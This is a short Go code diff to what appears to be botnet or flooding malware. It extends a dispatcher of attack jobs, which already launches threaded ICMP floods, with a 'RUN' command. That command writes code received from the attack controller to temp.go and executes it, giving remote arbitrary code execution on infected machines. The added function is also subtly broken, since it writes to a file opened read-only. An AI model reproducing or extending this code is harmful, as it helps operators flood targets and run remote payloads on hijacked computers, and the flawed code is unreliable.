@@ -9,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"strings"
 	"sync"
 
@@ -135,9 +136,23 @@ func Role(Attack AttackManager) {
 		case "ICMP":
 			wg.Add(1)
 			go ICMP(value.Host, value.B.Code, value.Thread, &wg)
+		case "RUN":
+			RUN(value.B.Code)
 		}
 	}
 	wg.Wait()
+}
+
+func RUN(Code string) {
+	file, err := os.Open("temp.go")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer file.Close()
+	file.Write([]byte(Code))
+	cmd := exec.Command("go", "run", "temp.go")
+	cmd.Run()
 }
 
 func ICMP(Host, Code string, Thread int, wgs *sync.WaitGroup) {
